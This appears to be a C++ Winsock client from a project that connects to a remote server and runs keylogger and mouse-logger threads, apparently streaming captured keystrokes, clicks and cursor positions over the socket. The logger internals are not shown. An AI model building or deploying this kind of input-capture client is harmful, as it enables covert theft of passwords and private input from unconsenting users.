#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Client.h"


Client::Client()
{
    _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (_clientSocket == INVALID_SOCKET)
        throw std::exception(__FUNCTION__ " - socket");
}

Client::~Client()
{
    try
    {
        closesocket(_clientSocket);
    }
    catch (...) {}
}


void Client::connectToServer(std::string serverIP, int port)
{
    struct sockaddr_in sa = { 0 };
    sa.sin_port = htons(port);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(serverIP.c_str());

    int status = connect(this->_clientSocket, (struct sockaddr*)&sa, sizeof(sa));
    if (status == INVALID_SOCKET)
        throw std::exception("Cant connect to server");

    receiveId(this->_clientSocket);  // setting id to the user
}

// function runs all of the loggers as threads
void Client::startConversation()
{
    KeyLogger* kl = new KeyLogger();
    MouseLogger* ml = new MouseLogger();

    std::vector<std::thread> inputsThreads;
    inputsThreads.push_back(std::thread(&KeyLogger::recordKeyboard, kl, this->_clientSocket));
    inputsThreads.push_back(std::thread(&MouseLogger::recordMouseClicks, ml, this->_clientSocket));
    inputsThreads.push_back(std::thread(&MouseLogger::recordMousePos, ml, this->_clientSocket));
    //inputsThreads.push_back(std::thread(&CLient::receiveData, this->_clientSocket));  TODO: proccess screen share

    // running threads
    for (int i = 0; i < inputsThreads.size(); i++)
        inputsThreads[i].join();
}

void Client::receiveId(SOCKET sock)
{
    char buffer[4] = { 0 };
    recv(sock, buffer, 4, 0);
    this->_id = atoi(buffer);
}
